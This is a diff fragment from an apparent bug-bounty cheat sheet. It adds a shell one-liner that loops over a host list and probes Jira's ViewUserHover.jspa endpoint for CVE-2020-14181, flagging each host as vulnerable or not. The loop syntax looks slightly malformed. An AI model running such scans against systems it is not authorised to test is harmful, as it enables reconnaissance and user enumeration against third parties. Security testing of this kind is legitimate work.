@@ -132,6 +132,12 @@ cat hosts.txt or =>
 echo "https://jira.exmaple.com"|while read host do; do curl -s -k --insecure --path-as-is "$host/secure/QueryComponent\!Default.jspa"|grep -qsi 'searchers' &&
 printf "$host \033[0;31mVulnerable\n"||printf "$host \033[0;32mNot Vulnerable\n";done
 
+
+cve 2020-14181
+/secure/ViewUserHover.jspa
+
+cat hosts.txt | while read host do; do curl -s -k --insecure "$host/secure/ViewUserHover.jspa"|grep -qsi "User does not exist"&&
+\printf "$host\033[0;31mVulnerable\n"||printf "$host \033[0;32mNot Vulnerable\n";done
   
   -------------------------------------------------------------------------------------------------
   
